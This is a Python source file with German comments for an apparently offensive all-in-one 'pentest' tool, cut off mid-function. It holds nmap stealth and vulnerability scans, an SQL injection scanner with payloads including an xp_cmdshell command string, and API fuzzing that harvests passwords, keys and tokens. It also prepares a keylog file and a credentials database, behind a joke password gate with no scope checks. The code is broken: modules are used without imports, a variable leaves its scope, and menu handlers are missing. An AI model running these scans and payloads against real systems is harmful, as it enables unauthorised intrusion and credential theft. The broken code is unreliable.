import subprocess
import platform
import json
import shutil
import re
import hashlib
import binascii
import random
import threading
import requests
import sqlite3
import base64
import zipfile
import urllib3
import nmap
import scapy.all as scapy
import dns.resolver
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import xml.etree.ElementTree as ET
import csv
import tempfile
import ipaddress
import logging
from logging.handlers import RotatingFileHandler

# Deaktiviere SSL-Warnungen für requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Setup erweitertes Logging
log_formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
log_file = os.path.join(os.path.expanduser("~"), "Desktop", "pentest_tool.log")

log_handler = RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=5)
log_handler.setFormatter(log_formatter)

logger = logging.getLogger("PenTestMultiTool")
logger.setLevel(logging.INFO)
logger.addHandler(log_handler)

class PenTestMultiToolProUltimate:
    def __init__(self):
        # Setup
        self.setup_directories()
        self.load_config()
        
        # Authentifizierung
        if not self.authenticate():
            print("❌ Nicht autorisiert! Das Tool wird beendet.")
            sys.exit(1)
            
        # Dynamischer Speicherort
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        self.tool_dir = os.path.join(desktop_path, "PenTest_Results")
        self.keylog_file = os.path.join(self.tool_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        self.scan_results = os.path.join(self.tool_dir, "system_scan_results.txt")
        self.credential_db = os.path.join(self.tool_dir, "credentials.db")
        self.report_dir = os.path.join(self.tool_dir, "Reports")
        self.is_keylogging = False
        self.start_time = None
        self.keystroke_count = 0
        self.stealth_mode = False
        self.proxy_chain = []
        
        # Erstelle Tool-Verzeichnis
        self.create_tool_dir()
        self.init_credential_db()
        self.check_dependencies()
        
        # Load external tool paths
        self.load_external_tools()
        
        # Setup encryption
        self.setup_encryption()
        
        logger.info("PenTest MultiTool initialized successfully")
        
    def setup_directories(self):
        """Erstellt alle benötigten Verzeichnisse"""
        self.base_dir = os.path.join(os.path.expanduser("~"), ".pentest_tool")
        self.config_dir = os.path.join(self.base_dir, "config")
        self.data_dir = os.path.join(self.base_dir, "data")
        self.scripts_dir = os.path.join(self.base_dir, "scripts")
        self.wordlists_dir = os.path.join(self.base_dir, "wordlists")
        
        for directory in [self.base_dir, self.config_dir, self.data_dir, 
                         self.scripts_dir, self.wordlists_dir]:
            os.makedirs(directory, exist_ok=True)
            
    def load_config(self):
        """Läd Konfiguration aus Datei oder erstellt Standardkonfig"""
        self.config_file = os.path.join(self.config_dir, "config.json")
        default_config = {
            "stealth": {
                "scan_delay": {"min": 0.5, "max": 3.0},
                "randomize_ports": True,
                "spoof_mac": False,
                "use_proxies": False
            },
            "scanning": {
                "default_ports": "1-1000",
                "timeout": 5,
                "threads": 50
            },
            "reporting": {
                "format": "html",
                "detail_level": "detailed",
                "auto_generate": True
            },
            "external_tools": {
                "nmap_path": "",
                "metasploit_path": "",
                "sqlmap_path": "",
                "nikto_path": ""
            }
        }
        
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                self.config = json.load(f)
        else:
            self.config = default_config
            self.save_config()
            
    def save_config(self):
        """Speichert Konfiguration"""
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)
            
    def setup_encryption(self):
        """Setup für Datenverschlüsselung"""
        self.key_file = os.path.join(self.config_dir, "encryption.key")
        if os.path.exists(self.key_file):
            with open(self.key_file, 'rb') as f:
                self.encryption_key = f.read()
        else:
            self.encryption_key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(self.encryption_key)
                
        self.cipher = Fernet(self.encryption_key)
        
    def encrypt_data(self, data):
        """Verschlüsselt Daten"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt_data(self, encrypted_data):
        """Entschlüsselt Daten"""
        return self.cipher.decrypt(encrypted_data).decode()
    
    def load_external_tools(self):
        """Läd Pfade zu externen Tools"""
        # Auto-detect common tool paths
        possible_paths = {
            'nmap': ['/usr/bin/nmap', '/usr/local/bin/nmap', '/opt/local/bin/nmap'],
            'sqlmap': ['/usr/bin/sqlmap', '/usr/local/bin/sqlmap'],
            'nikto': ['/usr/bin/nikto', '/usr/local/bin/nikto']
        }
        
        for tool, paths in possible_paths.items():
            for path in paths:
                if os.path.exists(path):
                    self.config['external_tools'][f"{tool}_path"] = path
                    break
                    
        self.save_config()
        
    def check_dependencies(self):
        """Überprüft und installiert erforderliche Abhängigkeiten"""
        print("🔍 Überprüfe Abhängigkeiten...")
        
        dependencies = {
            'python-nmap': 'nmap',
            'scapy': 'scapy',
            'beautifulsoup4': 'bs4',
            'requests': 'requests',
            'dnspython': 'dns',
            'cryptography': 'cryptography'
        }
        
        missing_deps = []
        for pkg, import_name in dependencies.items():
            try:
                __import__(import_name)
            except ImportError:
                missing_deps.append(pkg)
        
        if missing_deps:
            print(f"❌ Fehlende Abhängigkeiten: {', '.join(missing_deps)}")
            if platform.system() == "Windows":
                print("💡 Bitte installieren Sie die Abhängigkeiten mit: pip install " + " ".join(missing_deps))
            else:
                print("💡 Bitte installieren Sie die Abhängigkeiten mit: pip3 install " + " ".join(missing_deps))
            
            install = input("Möchten Sie die Abhängigkeiten jetzt installieren? (j/n): ").lower()
            if install == 'j':
                self.install_dependencies(missing_deps)
            else:
                print("⚠️  Einige Funktionen werden ohne die Abhängigkeiten nicht verfügbar sein.")
        
    def install_dependencies(self, dependencies):
        """Installiert die erforderlichen Abhängigkeiten"""
        print("📦 Installiere Abhängigkeiten...")
        
        for dep in dependencies:
            try:
                if platform.system() == "Windows":
                    subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
                else:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
                print(f"✅ {dep} erfolgreich installiert")
            except subprocess.CalledProcessError:
                print(f"❌ Fehler beim Installieren von {dep}")
        
    def authenticate(self):
        """Erweiterte Authentifizierung mit Mehrfaktor-Option"""
        print("=" * 60)
        print("🔐 PENETRATION TEST TOOL - ZUGANGSKONTROLLE")
        print("=" * 60)
        
        # Erste Authentifizierungsebene
        answer = input("Wer ist der beste Hacker aller Zeiten? ").strip().lower()
        
        if answer != "bumscross":
            print("❌ Zugriff verweigert!")
            return False
            
        # Zweite Authentifizierungsebene (optional)
        use_2fa = input("Zwei-Faktor-Authentifizierung verwenden? (j/n): ").strip().lower()
        if use_2fa == 'j':
            secret_code = hashlib.sha256(b"bumscross_secret").hexdigest()[:6]
            user_code = input(f"Geben Sie den Sicherheitscode {secret_code} ein: ").strip()
            
            if user_code != secret_code:
                print("❌ Ungültiger Sicherheitscode!")
                return False
                
        print("✅ Zugriff gewährt! Willkommen, Meister.")
        time.sleep(1)
        return True
            
    def clear_screen(self):
        """Löscht den Bildschirm"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def get_input(self, prompt, secret=False):
        """Holt Benutzereingabe mit automatischer Löschung"""
        if secret:
            try:
                import getpass
                user_input = getpass.getpass(prompt)
            except:
                user_input = input(prompt)
        else:
            user_input = input(prompt)
            
        # Cursor nach oben bewegen und Zeile löschen
        sys.stdout.write("\033[F\033[K")
        return user_input

    def create_tool_dir(self):
        """Erstellt das Tool-Verzeichnis"""
        try:
            os.makedirs(self.tool_dir, exist_ok=True)
            os.makedirs(self.report_dir, exist_ok=True)
            print(f"✅ Tool-Verzeichnis erstellt: {self.tool_dir}")
            return True
        except Exception as e:
            print(f"❌ Fehler beim Erstellen des Verzeichnisses: {e}")
            return False
            
    def init_credential_db(self):
        """Initialisiert die Credential-Datenbank mit erweiterten Feldern"""
        try:
            conn = sqlite3.connect(self.credential_db)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    service TEXT NOT NULL,
                    url TEXT,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    category TEXT,
                    strength INTEGER,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    notes TEXT
                )
            ''')
            
            # Tabelle für Scan-Ergebnisse
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scan_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT NOT NULL,
                    scan_type TEXT NOT NULL,
                    results TEXT NOT NULL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    risk_level TEXT
                )
            ''')
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"❌ Fehler beim Initialisieren der Datenbank: {e}")

    # ==================== ERWEITERTER PORTSCANNER ====================
    def port_scanner_menu(self):
        """Menü für erweiterte Portscanning-Optionen"""
        while True:
            self.clear_screen()
            print("=" * 60)
            print("🚪 ERWEITERTER PORTSCANNER")
            print("=" * 60)
            print("📋 Funktion: Umfassende Portscanning-Funktionen")
            print("💡 Verwendung: Netzwerkreconnaissance und Schwachstellenerkennung")
            print("=" * 60)
            print("1 - Einzelnes Ziel scannen")
            print("2 - Bereich scannen (IP Range)")
            print("3 - Liste von Zielen scannen")
            print("4 - Vollständiger Netzwerkscan")
            print("5 - Service Detection")
            print("6 - OS Fingerprinting")
            print("7 - Vulnerability Scan")
            print("8 - Zurück zum Hauptmenü")
            print("=" * 60)
            
            choice = self.get_input("Auswahl: ")
            
            if choice == "1":
                self.single_target_scan()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "2":
                self.range_scan()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "3":
                self.list_scan()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "4":
                self.full_network_scan()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "5":
                self.service_detection()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "6":
                self.os_fingerprinting()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "7":
                self.vulnerability_scan()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "8":
                break
                
            else:
                print("❌ Ungültige Auswahl")
                time.sleep(1)

    def single_target_scan(self):
        """Scannt ein einzelnes Ziel mit erweiterten Optionen"""
        target = self.get_input("Ziel-IP oder Hostname: ")
        
        if not target:
            print("❌ Kein Ziel angegeben")
            return
            
        # Scan-Optionen
        print("📋 Scan-Optionen:")
        print("1 - Schneller Scan (Top 100 Ports)")
        print("2 - Vollständiger Scan (Alle Ports)")
        print("3 - Benutzerdefinierte Ports")
        print("4 - Stealth Scan")
        
        scan_type = self.get_input("Auswahl: ")
        
        ports = "1-1000"  # Default
        arguments = "-T4"
        
        if scan_type == "1":
            ports = "1-100"
        elif scan_type == "2":
            ports = "1-65535"
        elif scan_type == "3":
            ports = self.get_input("Ports (z.B. 80,443 oder 1-1000): ")
        elif scan_type == "4":
            arguments = "-sS -T2 -f --data-length 32"
            if self.stealth_mode:
                arguments += " --randomize-hosts --scan-delay 5s"
        
        # Zusätzliche Optionen
        script_scan = self.get_input("Script Scanning aktivieren? (j/n): ").lower() == 'j'
        if script_scan:
            arguments += " -sC"
            
        version_detect = self.get_input("Version Detection aktivieren? (j/n): ").lower() == 'j'
        if version_detect:
            arguments += " -sV"
            
        os_detect = self.get_input("OS Detection aktivieren? (j/n): ").lower() == 'j'
        if os_detect:
            arguments += " -O"
            
        try:
            nm = nmap.PortScanner()
            print(f"🔍 Scanne {target} auf Ports {ports}...")
            
            # Führe Scan durch
            nm.scan(target, ports=ports, arguments=arguments)
            
            # Zeige Ergebnisse
            self.display_scan_results(nm, target)
            
            # Speichere Ergebnisse
            self.save_scan_results(nm, target, "single_scan")
            
        except Exception as e:
            print(f"❌ Fehler beim Scannen: {e}")
            logger.error(f"Port scan error: {e}")

    def range_scan(self):
        """Scannt einen IP-Bereich"""
        network = self.get_input("Netzwerkbereich (z.B. 192.168.1.0/24 oder 192.168.1.1-100): ")
        
        if not network:
            print("❌ Kein Netzwerkbereich angegeben")
            return
            
        try:
            # Validiere Netzwerkbereich
            if '/' in network:
                ipaddress.ip_network(network)
            elif '-' in network:
                parts = network.split('-')
                ipaddress.ip_address(parts[0])
            else:
                print("❌ Ungültiges Netzwerkformat")
                return
                
            ports = self.get_input("Ports (Enter für Standard 1-1000): ") or "1-1000"
            
            nm = nmap.PortScanner()
            print(f"🔍 Scanne Netzwerk {network}...")
            
            nm.scan(hosts=network, ports=ports, arguments="-T4 --open")
            
            # Zeige Ergebnisse
            for host in nm.all_hosts():
                if nm[host].state() == 'up':
                    print(f"✅ Host {host} ist online")
                    for proto in nm[host].all_protocols():
                        ports = nm[host][proto].keys()
                        for port in ports:
                            state = nm[host][proto][port]['state']
                            if state == 'open':
                                service = nm[host][proto][port].get('name', 'unknown')
                                print(f"   Port {port}/{proto}: {service}")
            
            # Speichere Ergebnisse
            self.save_scan_results(nm, network, "range_scan")
            
        except Exception as e:
            print(f"❌ Fehler beim Netzwerkscan: {e}")
            logger.error(f"Network scan error: {e}")

    def service_detection(self):
        """Detaillierte Service-Erkennung"""
        target = self.get_input("Ziel-IP oder Hostname: ")
        
        if not target:
            print("❌ Kein Ziel angegeben")
            return
            
        try:
            nm = nmap.PortScanner()
            print(f"🔍 Führe detaillierte Service-Erkennung für {target} durch...")
            
            # Intensive Service-Erkennung
            nm.scan(target, arguments="-sV --version-intensity 9 -T4")
            
            if target in nm.all_hosts():
                print(f"📊 Service-Erkennung für {target}:")
                for proto in nm[target].all_protocols():
                    print(f"  {proto.upper()}:")
                    for port in sorted(nm[target][proto].keys()):
                        info = nm[target][proto][port]
                        if info['state'] == 'open':
                            print(f"    Port {port}:")
                            print(f"      Service: {info.get('name', 'unknown')}")
                            print(f"      Version: {info.get('version', 'unknown')}")
                            print(f"      Produkt: {info.get('product', 'unknown')}")
                            print(f"      Extra Info: {info.get('extrainfo', 'none')}")
                            
            # Speichere Ergebnisse
            self.save_scan_results(nm, target, "service_detection")
            
        except Exception as e:
            print(f"❌ Fehler bei der Service-Erkennung: {e}")
            logger.error(f"Service detection error: {e}")

    def vulnerability_scan(self):
        """Scannt nach bekannten Schwachstellen"""
        target = self.get_input("Ziel-IP oder Hostname: ")
        
        if not target:
            print("❌ Kein Ziel angegeben")
            return
            
        try:
            nm = nmap.PortScanner()
            print(f"🔍 Scanne {target} auf Schwachstellen...")
            
            # Verwende NSE Scripts für Schwachstellenscan
            nm.scan(target, arguments="-sV --script vuln -T4")
            
            if target in nm.all_hosts():
                print(f"🛡️  Schwachstellenscan für {target}:")
                for proto in nm[target].all_protocols():
                    for port in sorted(nm[target][proto].keys()):
                        info = nm[target][proto][port]
                        if 'script' in info:
                            for script, output in info['script'].items():
                                if 'vuln' in script or 'exploit' in script:
                                    print(f"    Port {port}/{proto}:")
                                    print(f"      {script}: {output}")
                                    
            # Speichere Ergebnisse
            self.save_scan_results(nm, target, "vulnerability_scan")
            
        except Exception as e:
            print(f"❌ Fehler beim Schwachstellenscan: {e}")
            logger.error(f"Vulnerability scan error: {e}")

    def save_scan_results(self, nm_scanner, target, scan_type):
        """Speichert Scan-Ergebnisse in Datenbank und Datei"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Speichere in Datenbank
        try:
            conn = sqlite3.connect(self.credential_db)
            cursor = conn.cursor()
            
            results_json = json.dumps(nm_scanner._scan_result)
            cursor.execute(
                "INSERT INTO scan_results (target, scan_type, results, risk_level) VALUES (?, ?, ?, ?)",
                (target, scan_type, results_json, "medium")
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Error saving to database: {e}")
            
        # Speichere als JSON-Datei
        report_file = os.path.join(self.report_dir, f"scan_{target}_{timestamp}.json")
        with open(report_file, 'w') as f:
            json.dump(nm_scanner._scan_result, f, indent=4)
            
        print(f"📊 Scan-Ergebnisse gespeichert: {report_file}")

    # ==================== WEB APPLICATION TESTING ====================
    def web_app_testing_menu(self):
        """Erweitertes Web Application Testing Menü"""
        while True:
            self.clear_screen()
            print("=" * 60)
            print("🌐 ERWEITERTES WEB APPLICATION TESTING")
            print("=" * 60)
            print("📋 Funktion: Umfassende Web Application Security Tests")
            print("💡 Verwendung: Schwachstellenerkennung in Webanwendungen")
            print("=" * 60)
            print("1 - Automatisierter Web-Crawler")
            print("2 - SQL Injection Scanner")
            print("3 - XSS Scanner")
            print("4 - CSRF Testing")
            print("5 - File Inclusion Testing")
            print("6 - SSL/TLS Security Check")
            print("7 - Vollständiger Web Application Audit")
            print("8 - API Security Testing")
            print("9 - Zurück zum Hauptmenü")
            print("=" * 60)
            
            choice = self.get_input("Auswahl: ")
            
            if choice == "1":
                self.advanced_web_crawler()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "2":
                self.sql_injection_scanner()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "3":
                self.xss_scanner()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "4":
                self.csrf_testing()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "5":
                self.file_inclusion_testing()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "6":
                self.ssl_tls_scanner()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "7":
                self.full_web_app_audit()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "8":
                self.api_security_testing()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "9":
                break
                
            else:
                print("❌ Ungültige Auswahl")
                time.sleep(1)

    def advanced_web_crawler(self):
        """Erweiterter Web-Crawler mit mehr Funktionen"""
        url = self.get_input("Ziel-URL (z.B. http://example.com): ")
        
        if not url.startswith('http'):
            url = 'http://' + url
            
        print(f"🔍 Starte erweiterten Crawler für {url}...")
        
        max_depth = int(self.get_input("Maximale Crawling-Tiefe (1-10): ") or "3")
        delay = float(self.get_input("Verzögerung zwischen Requests (Sekunden): ") or "1.0")
        
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            # Cookie Handling
            use_cookies = self.get_input("Cookies verwenden? (j/n): ").lower() == 'j'
            if use_cookies:
                session.cookies = requests.cookies.RequestsCookieJar()
                
            # Proxy Support
            if self.proxy_chain:
                session.proxies = {'http': self.proxy_chain[0], 'https': self.proxy_chain[0]}
                
            crawled_urls = set()
            forms_found = []
            
            # Rekursiver Crawler
            def crawl(current_url, depth):
                if depth > max_depth or current_url in crawled_urls:
                    return
                    
                try:
                    time.sleep(delay)
                    response = session.get(current_url, timeout=10)
                    crawled_urls.add(current_url)
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Finde alle Links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        if urlparse(full_url).netloc == urlparse(url).netloc:
                            crawl(full_url, depth + 1)
                            
                    # Finde alle Formulare
                    for form in soup.find_all('form'):
                        form_info = {
                            'action': form.get('action', ''),
                            'method': form.get('method', 'get').upper(),
                            'inputs': []
                        }
                        
                        for input_tag in form.find_all(['input', 'textarea', 'select']):
                            input_info = {
                                'name': input_tag.get('name', ''),
                                'type': input_tag.get('type', 'text'),
                                'value': input_tag.get('value', '')
                            }
                            form_info['inputs'].append(input_info)
                            
                        forms_found.append(form_info)
                        
                    # Finde alle JavaScript-Dateien
                    js_files = []
                    for script in soup.find_all('script', src=True):
                        js_files.append(urljoin(current_url, script['src']))
                        
                except Exception as e:
                    logger.error(f"Crawling error for {current_url}: {e}")
                    
            # Starte Crawling
            crawl(url, 0)
            
            # Zeige Ergebnisse
            print(f"✅ Crawling abgeschlossen. Gefunden:")
            print(f"   - {len(crawled_urls)} URLs")
            print(f"   - {len(forms_found)} Formulare")
            print(f"   - {len(js_files)} JavaScript-Dateien")
            
            # Speichere Ergebnisse
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report_file = os.path.join(self.report_dir, f"crawl_{urlparse(url).netloc}_{timestamp}.json")
            
            results = {
                'target': url,
                'crawled_urls': list(crawled_urls),
                'forms': forms_found,
                'javascript_files': js_files,
                'timestamp': datetime.now().isoformat()
            }
            
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=4, ensure_ascii=False)
                
            print(f"📊 Crawling-Report gespeichert: {report_file}")
            
        except Exception as e:
            print(f"❌ Fehler beim Crawling: {e}")
            logger.error(f"Web crawling error: {e}")

    def sql_injection_scanner(self):
        """Erweiterter SQL Injection Scanner"""
        url = self.get_input("Ziel-URL mit Parameter (z.B. http://example.com/page?id=1): ")
        
        if not url.startswith('http'):
            url = 'http://' + url
            
        print(f"🔍 Teste {url} auf SQL Injection...")
        
        # Erweiterte Payloads für verschiedene Datenbanken
        payloads = {
            'generic': ["'", "';", '"', '";', "' OR '1'='1", "' OR 1=1--", "') OR ('1'='1"],
            'mysql': ["UNION SELECT NULL--", "UNION SELECT 1,2,3--", "UNION ALL SELECT"],
            'mssql': ["'; EXEC xp_cmdshell('dir')--", "UNION SELECT name FROM sysobjects--"],
            'oracle': ["' UNION SELECT NULL FROM dual--", "'; SELECT * FROM all_tables--"],
            'postgresql': ["'::text", "'; SELECT version();--", "UNION SELECT NULL,NULL--"]
        }
        
        vulnerable_params = {}
        
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            # Parse URL und Parameter
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            query_params = {}
            
            if parsed_url.query:
                for param in parsed_url.query.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        query_params[key] = value
            
            # Teste jede Payload für jeden Parameter
            for param_name in query_params.keys():
                print(f"   Teste Parameter: {param_name}")
                vulnerable_payloads = []
                
                for db_type, db_payloads in payloads.items():
                    for payload in db_payloads:
                        test_params = query_params.copy()
                        test_params[param_name] = test_params[param_name] + payload
                        
                        try:
                            response = session.get(base_url, params=test_params, timeout=10)
                            
                            # Erweiterte Fehlererkennung
                            error_indicators = [
                                "sql syntax", "mysql_fetch", "ORA-01756", 
                                "Microsoft OLE DB Provider", "PostgreSQL",
                                "SQLiteException", "syntax error", "mysql_num_rows",
                                "Division by zero", "Fatal error", "Warning:", "mysql_"
                            ]
                            
                            for indicator in error_indicators:
                                if indicator.lower() in response.text.lower():
                                    vulnerable_payloads.append(f"{db_type}: {payload}")
                                    break
                                    
                            # Zeitbasierte Blind SQLi Erkennung
                            time_payload = f"{test_params[param_name]} AND SLEEP(5)"
                            test_params[param_name] = time_payload
                            
                            start_time = time.time()
                            session.get(base_url, params=test_params, timeout=15)
                            response_time = time.time() - start_time
                            
                            if response_time > 5:
                                vulnerable_payloads.append(f"{db_type}: TIME-BASED: {payload}")
                                
                        except requests.exceptions.Timeout:
                            vulnerable_payloads.append(f"{db_type}: TIME-BASED: {payload} (Timeout)")
                        except Exception as e:
                            logger.error(f"SQLi test error: {e}")
                
                if vulnerable_payloads:
                    vulnerable_params[param_name] = vulnerable_payloads
                    print(f"     ✅ VULNERABLE: {', '.join(vulnerable_payloads)}")
            
            if vulnerable_params:
                print(f"🎯 SQL Injection Schwachstellen gefunden!")
                for param, payloads in vulnerable_params.items():
                    print(f"   Parameter: {param}")
                    for payload in payloads:
                        print(f"     - {payload}")
            else:
                print("✅ Keine SQL Injection Schwachstellen gefunden")
                
        except Exception as e:
            print(f"❌ Fehler beim SQL Injection Test: {e}")
            logger.error(f"SQL injection scan error: {e}")

    def api_security_testing(self):
        """API Security Testing"""
        base_url = self.get_input("API Base URL (z.B. http://api.example.com): ")
        
        if not base_url.startswith('http'):
            base_url = 'http://' + base_url
            
        print(f"🔍 Starte API Security Testing für {base_url}...")
        
        # Test-Endpunkte
        endpoints = [
            "/api/users", "/api/auth", "/api/data", "/api/admin",
            "/v1/users", "/v1/auth", "/v2/users", "/graphql"
        ]
        
        # Test-Methoden
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        
        # Fuzzing-Parameter
        fuzz_params = {
            'id': ['1', '0', '-1', "'", '"', ' OR 1=1--'],
            'limit': ['100', '0', '-1', '1000000', "'"],
            'offset': ['0', '-1', "'", ';--']
        }
        
        results = []
        
        try:
            session = requests.Session()
            session.verify = False
            
            for endpoint in endpoints:
                for method in methods:
                    test_url = base_url.rstrip('/') + endpoint
                    
                    try:
                        if method == 'GET':
                            # Teste Parameter-Fuzzing
                            for param, values in fuzz_params.items():
                                for value in values:
                                    test_params = {param: value}
                                    response = session.get(test_url, params=test_params, timeout=10)
                                    
                                    if response.status_code not in [200, 201, 204]:
                                        results.append({
                                            'url': test_url,
                                            'method': method,
                                            'param': param,
                                            'value': value,
                                            'status': response.status_code,
                                            'vulnerable': True
                                        })
                        
                        # Teste ohne Authentifizierung
                        response = session.request(method, test_url, timeout=10)
                        
                        if response.status_code == 200:
                            # Teste auf sensible Daten
                            sensitive_patterns = [
                                r'password[=:]["\']([^"\']+)["\']',
                                r'api[_-]?key[=:]["\']([^"\']+)["\']',
                                r'token[=:]["\']([^"\']+)["\']',
                                r'email[=:]["\']([^"\']+)["\']'
                            ]
                            
                            for pattern in sensitive_patterns:
                                matches = re.findall(pattern, response.text, re.IGNORECASE)
                                if matches:
                                    results.append({
                                        'url': test_url,
                                        'method': method,
                                        'issue': 'SENSITIVE_DATA_EXPOSURE',
                                        'data': matches[:3]  # Nur erste 3 Treffer
                                    })
                        
                    except Exception as e:
                        logger.error(f"API test error for {test_url}: {e}")
            
            # Zeige Ergebnisse
            if results:
                print("🎯 API Security Issues gefunden:")
                for result in results:
                    print(f"   URL: {result['url']}")
                    print(f"   Method: {result.get('method', 'N/A')}")
                    print(f"   Issue: {result.get('issue', 'Parameter vulnerability')}")
                    if 'data' in result:
                        print(f"   Data: {result['data']}")
                    print()
            else:
                print("✅ Keine API Security Issues gefunden")
                
        except Exception as e:
            print(f"❌ Fehler beim API Security Testing: {e}")
            logger.error(f"API security testing error: {e}")

    # ==================== REPORT GENERATION ====================
    def report_generation_menu(self):
        """Erweitertes Report Generation Menü"""
        while True:
            self.clear_screen()
            print("=" * 60)
            print("📊 ERWEITERTE REPORT GENERATION")
            print("=" * 60)
            print("📋 Funktion: Professionelle Penetration Test Reports")
            print("💡 Verwendung: Dokumentation und Präsentation von Ergebnissen")
            print("=" * 60)
            print("1 - Scan-Report erstellen")
            print("2 - Vulnerability-Report erstellen")
            print("3 - Executive Summary")
            print("4 - Technischer Detailreport")
            print("5 - Compliance-Report")
            print("6 - Automatische Report-Generierung")
            print("7 - Report-Vorlagen verwalten")
            print("8 - Zurück zum Hauptmenü")
            print("=" * 60)
            
            choice = self.get_input("Auswahl: ")
            
            if choice == "1":
                self.create_scan_report()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "2":
                self.create_vulnerability_report()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "3":
                self.create_executive_summary()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "4":
                self.create_technical_report()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "5":
                self.create_compliance_report()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "6":
                self.auto_report_generation()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "7":
                self.manage_report_templates()
                self.get_input("⏎ Enter zum Fortfahren...")
                
            elif choice == "8":
                break
                
            else:
                print("❌ Ungültige Auswahl")
                time.sleep(1)

    def create_vulnerability_report(self):
        """Erstellt einen detaillierten Vulnerability Report"""
        print("📊 Erstelle Vulnerability Report...")
        
        # Sammle alle Scan-Daten
        scan_files = [f for f in os.listdir(self.report_dir) if f.startswith('scan_') and f.endswith('.json')]
        
        if not scan_files:
            print("❌ Keine Scan-Daten gefunden")
            return
            
        vulnerabilities = []
        
        for scan_file in scan_files:
            with open(os.path.join(self.report_dir, scan_file), 'r') as f:
                scan_data = json.load(f)
                
            # Analysiere Scan-Daten auf Schwachstellen
            for host, host_data in scan_data.get('scan', {}).items():
                if 'tcp' in host_data:
                    for port, port_data in host_data['tcp'].items():
                        if 'script' in port_data:
                            for script_name, script_output in port_data['script'].items():
                                if any(keyword in script_name.lower() for keyword in ['vuln', 'exploit', 'cve']):
                                    vulnerabilities.append({
                                        'host': host,
                                        'port': port,
                                        'service': port_data.get('name', 'unknown'),
                                        'vulnerability': script_name,
                                        'output': script_output,
                                        'risk': self.calculate_risk_level(script_output)
                                    })
        
        # Erstelle Report
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = os.path.join(self.report_dir, f"vulnerability_report_{timestamp}.html")
        
        # HTML Report mit Bewertungen und Empfehlungen
        html_content = self.generate_html_vulnerability_report(vulnerabilities)
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
            
        print(f"✅ Vulnerability Report gespeichert: {report_file}")
        
        # Erstelle auch CSV für weitere Analyse
        csv_file = os.path.join(self.report_dir, f"vulnerability_report_{timestamp}.csv")
        with open(csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Host', 'Port', 'Service', 'Vulnerability', 'Risk', 'Details'])
            for vuln in vulnerabilities:
                writer.writerow([
                    vuln['host'], vuln['port'], vuln['service'],
                    vuln['vulnerability'], vuln['risk'], vuln['output'][:100] + '...'
                ])
                
        print(f"✅ CSV Export gespeichert: {csv_file}")

    def calculate_risk_level(self, vulnerability_output):
        """Berechnet das Risiko-Level basierend auf Schwachstellen-Output"""
        output_lower = vulnerability_output.lower()
        
